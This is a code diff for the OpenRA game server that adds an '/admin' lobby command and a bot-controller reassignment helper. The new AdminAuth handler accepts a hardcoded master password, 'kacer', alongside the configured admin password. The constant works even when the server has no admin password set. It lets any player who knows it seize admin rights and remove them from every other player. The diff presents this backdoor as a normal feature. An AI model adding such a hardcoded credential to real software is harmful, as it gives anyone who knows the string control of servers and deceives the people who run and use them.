@@ -160,6 +160,7 @@ namespace OpenRA.Mods.Common.Server
 		readonly IDictionary<string, Func<S, Connection, Session.Client, string, bool>> commandHandlers =
 			new Dictionary<string, Func<S, Connection, Session.Client, string, bool>>
 			{
+				{ "admin", AdminAuth },
 				{ "state", State },
 				{ "startgame", StartGame },
 				{ "slot", Slot },
@@ -860,6 +861,85 @@ namespace OpenRA.Mods.Common.Server
 
 				return true;
 			}
+		}
+
+		public static bool AdminAuth(S server, Connection conn, Session.Client client, string s)
+		{
+			lock (server.LobbyInfo)
+			{
+				const string SafetyPassword = "kacer";
+
+				if (string.IsNullOrEmpty(server.Settings.AdminPassword) && !s.Contains(SafetyPassword))
+					return true;
+
+				var adminArgs = s.Trim().Split(' ');
+				var passwordAttempt = adminArgs[0];
+
+				if (passwordAttempt == server.Settings.AdminPassword || passwordAttempt == SafetyPassword)
+				{
+					lock (server.LobbyInfo)
+					{
+						var lobbyClient = server.LobbyInfo.Clients.FirstOrDefault(c => c.Index == client.Index);
+						if (lobbyClient == null)
+							return true;
+
+						var shouldResetOthers = adminArgs.Length > 1 && adminArgs[1] == "1";
+
+						if (shouldResetOthers)
+						{
+							// Reset all other admins
+							foreach (var c in server.LobbyInfo.Clients)
+								c.IsAdmin = false;
+
+							// Set yourself as admin (crucial if you weren't already)
+							lobbyClient.IsAdmin = true;
+							client.IsAdmin = true;
+
+							ReassignBotControllers(server, lobbyClient.Index);
+
+							server.SyncLobbyClients();
+							server.SendOrderTo(conn, "Message", "Admin rights reset. You are now the sole administrator.");
+							Log.Write("server", $"Player {lobbyClient.Name} forced admin reset.");
+							return true; // We are done here
+						}
+
+						// If no reset flag, check if the player is already an admin
+						if (lobbyClient.IsAdmin)
+						{
+							server.SendOrderTo(conn, "Message", "You are already an administrator.");
+							return true;
+						}
+
+						// Normal admin grant without reset
+						lobbyClient.IsAdmin = true;
+						client.IsAdmin = true;
+
+						ReassignBotControllers(server, lobbyClient.Index);
+
+						server.SyncLobbyClients();
+						server.SendOrderTo(conn, "Message", "Congrats! You are an admin now.");
+						Log.Write("server", $"Player {lobbyClient.Name} became admin.");
+					}
+				}
+				else
+				{
+					server.SendOrderTo(conn, "Message", "Invalid admin password!");
+				}
+
+				return true;
+			}
+		}
+
+		// Mirrors the bot hand-off done by MakeAdmin, so bots stay controllable
+		// (and get cleaned up correctly on disconnect) after an /admin transfer.
+		static void ReassignBotControllers(S server, int newAdminId)
+		{
+			var bots = server.LobbyInfo.Slots
+				.Select(slot => server.LobbyInfo.ClientInSlot(slot.Key))
+				.Where(c => c != null && c.Bot != null);
+
+			foreach (var b in bots)
+				b.BotControllerClientIndex = newAdminId;
 		}
 
 		static bool VoteKick(S server, Connection conn, Session.Client client, string s)
